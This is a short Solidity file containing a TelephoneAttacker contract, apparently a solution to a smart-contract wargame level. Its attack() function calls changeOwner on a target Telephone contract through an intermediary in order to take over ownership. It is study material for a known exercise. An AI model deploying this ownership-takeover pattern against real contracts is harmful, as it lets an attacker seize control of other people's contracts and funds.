// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttacker {
  Telephone telephone;

  constructor(address _telephone) {
    require(_telephone != address(0));
    telephone = Telephone(_telephone);
  }

  function attack() public {
    telephone.changeOwner(msg.sender);
  }
}
